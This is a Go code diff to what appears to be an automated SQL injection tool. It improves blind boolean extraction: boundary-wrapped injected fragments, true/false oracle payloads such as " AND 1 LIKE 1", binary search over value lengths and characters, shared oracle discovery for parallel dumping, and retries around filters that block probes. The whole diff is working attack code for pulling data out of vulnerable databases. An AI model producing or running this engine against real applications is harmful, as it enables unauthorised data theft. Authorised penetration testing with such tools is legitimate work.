@@ -95,6 +95,14 @@ func bypassInline(fragment string) string {
 
 // Request injects a fragment using the confirmed boundary.
 func (x *Executor) Request(fragment string) (string, int, error) {
+	body, length, _, err := x.RequestStatus(fragment)
+	return body, length, err
+}
+
+// RequestStatus is Request with the HTTP status of the response. Workers in a
+// parallel extraction each need their own status: the engine field belongs to
+// whichever request finished last.
+func (x *Executor) RequestStatus(fragment string) (string, int, int, error) {
 	payload := x.S.Boundary.Prefix + x.TransformFragment(fragment) + x.S.Boundary.Suffix
 	// When the application supplies the closing quote (empty suffix), the
 	// payload has to end with an open string literal so that quote is consumed
@@ -103,8 +111,8 @@ func (x *Executor) Request(fragment string) (string, int, error) {
 	if x.S.Boundary.Suffix == "" && !strings.HasSuffix(strings.TrimSpace(fragment), "'1'='1") {
 		payload += " AND '1'='1"
 	}
-	body, length, _, err := x.E.RequestAt(x.S.Point, payload)
-	return body, length, err
+	body, length, status, _, err := x.E.RequestAtStatus(x.S.Point, payload)
+	return body, length, status, err
 }
 
 var markerRE = regexp.MustCompile(`~([^~]*)~`)
@@ -365,18 +373,28 @@ func (x *Executor) booleanScalar(expr string) (string, error) {
 	if length > limit {
 		length = limit
 	}
-	var builder strings.Builder
+	if x.E.Opts.Verbose >= 2 {
+		x.E.Log.Info(fmt.Sprintf("blind value length: %d", length))
+	}
+	chars := make([]byte, length)
 	for pos := 1; pos <= length; pos++ {
 		ch, err := x.blindChar(expr, pos)
 		if err != nil {
-			return builder.String(), err
+			return string(chars[:pos-1]), err
 		}
-		if ch == 0 {
-			break
+		if ch == 0 || ch == 0x7f {
+			// A zero or DEL byte means the oracle answered out of range: the
+			// value ends here, or the expression produced a type the engine
+			// cannot read back. Both stop the scan instead of padding the
+			// result with junk.
+			return string(chars[:pos-1]), nil
 		}
-		builder.WriteByte(byte(ch))
+		chars[pos-1] = byte(ch)
+		if x.E.Opts.Verbose >= 2 && pos%10 == 0 {
+			x.E.Log.Info(fmt.Sprintf("blind value progress: %d/%d", pos, length))
+		}
 	}
-	return builder.String(), nil
+	return string(chars), nil
 }
 
 func (x *Executor) timeScalar(expr string) (string, error) {
@@ -408,11 +426,21 @@ func (x *Executor) timeScalar(expr string) (string, error) {
 func (x *Executor) blindLength(expr string) (int, error) {
 	lengthExpr := x.Dialect.Length(scalarExpr(expr))
 	before := atomic.LoadInt64(&x.blockedProbes)
-	value, err := x.binarySearch(0, x.maxLength(), func(mid int) bool {
+	// Most values are short names: a 0..256 search costs nine probes, and the
+	// wide search only runs when the value is provably longer.
+	value, err := x.binarySearch(0, 256, func(mid int) bool {
 		return x.booleanOracle(lengthExpr + " >= " + strconv.Itoa(mid))
 	})
 	if err != nil {
 		return 0, err
+	}
+	if value >= 256 {
+		value, err = x.binarySearch(256, x.maxLength(), func(mid int) bool {
+			return x.booleanOracle(lengthExpr + " >= " + strconv.Itoa(mid))
+		})
+		if err != nil {
+			return 0, err
+		}
 	}
 	if got := atomic.LoadInt64(&x.blockedProbes) - before; got > 3 {
 		return 0, fmt.Errorf("blind length blocked: %d oracle probes rejected by the filter", got)
@@ -484,27 +512,34 @@ var oraclePairs = [][2]string{
 	{" AND 1 LIKE 1", " AND 1 LIKE 2"},
 }
 
-// booleanOracle evaluates a condition by comparing its response with known
-// true and false reference responses.
-func (x *Executor) booleanOracle(cond string) bool {
-	x.mu.Lock()
-	if x.trueBody == "" || x.falseBody == "" {
-		for _, pair := range oraclePairs {
-			trueBody := x.booleanRequest(pair[0])
-			falseBody := x.booleanRequest(pair[1])
-			if trueBody == "" || falseBody == "" {
-				continue
-			}
-			if responsesDiffer(trueBody, falseBody) || booleanDiffer(trueBody, falseBody) {
-				x.trueBody, x.falseBody = trueBody, falseBody
-				break
-			}
+// oracleReferences returns the true and false reference bodies for this
+// target, discovering them once per engine. Discovery is shared because a
+// blind dump asks the same question for every character.
+func (e *Engine) oracleReferences(x *Executor) (string, string, bool) {
+	e.oracleMu.Lock()
+	defer e.oracleMu.Unlock()
+	if e.oracleTrue != "" && e.oracleFalse != "" {
+		return e.oracleTrue, e.oracleFalse, true
+	}
+	for index, pair := range oraclePairs {
+		trueBody := x.booleanRequest(pair[0])
+		falseBody := x.booleanRequest(pair[1])
+		if trueBody == "" || falseBody == "" {
+			continue
+		}
+		if responsesDiffer(trueBody, falseBody) || booleanDiffer(trueBody, falseBody) {
+			e.oracleTrue, e.oracleFalse, e.oraclePair = trueBody, falseBody, index
+			return trueBody, falseBody, true
 		}
 	}
-	trueBody, falseBody := x.trueBody, x.falseBody
-	x.mu.Unlock()
+	return "", "", false
+}
 
-	if trueBody == "" || falseBody == "" || !responsesDiffer(trueBody, falseBody) {
+// booleanOracle evaluates a condition by comparing its response with the known
+// true and false reference responses.
+func (x *Executor) booleanOracle(cond string) bool {
+	trueBody, falseBody, ok := x.E.oracleReferences(x)
+	if !ok {
 		return false
 	}
 	body := x.booleanRequest(" AND (" + cond + ")")
@@ -513,8 +548,8 @@ func (x *Executor) booleanOracle(cond string) bool {
 	}
 	// A blind extraction is thousands of requests; report movement so a long
 	// dump never looks like a hang.
-	if n := atomic.AddInt64(&x.probes, 1); n%50 == 0 && x.E.Opts.Verbose >= 1 {
-		x.E.Log.Info(fmt.Sprintf("blind extraction progress: %d oracle probes", n))
+	if n := atomic.AddInt64(&x.probes, 1); n%25 == 0 && x.E.Opts.Verbose >= 1 {
+		x.E.Log.Info(fmt.Sprintf("blind extraction: %d oracle probes, %d rejected", n, atomic.LoadInt64(&x.blockedProbes)))
 	}
 	// Pick the closer reference body. A fixed similarity threshold fails on
 	// large pages whose static chrome dominates the token set, and on oracle
@@ -526,15 +561,24 @@ func (x *Executor) booleanOracle(cond string) bool {
 }
 
 func (x *Executor) booleanRequest(fragment string) string {
-	body, length, err := x.Request(fragment)
-	if err != nil {
-		return ""
-	}
-	if looksBlocked(x.E.LastStatusCode, length) {
+	// A filter that rejects the first attempt often lets the tab-separated form
+	// through, and RequestAt already retries that. The extra attempt here
+	// covers a transient 429/406 that would otherwise be read as "false" and
+	// silently flip a binary search.
+	for attempt := 0; attempt < 2; attempt++ {
+		body, length, status, err := x.RequestStatus(fragment)
+		if err == nil && !looksBlocked(status, length) {
+			return body
+		}
+		if err != nil {
+			return ""
+		}
 		atomic.AddInt64(&x.blockedProbes, 1)
-		return ""
+		if attempt == 0 {
+			time.Sleep(400 * time.Millisecond)
+		}
 	}
-	return body
+	return ""
 }
 
 // timeOracle samples the delay once and repeats only when the first sample is
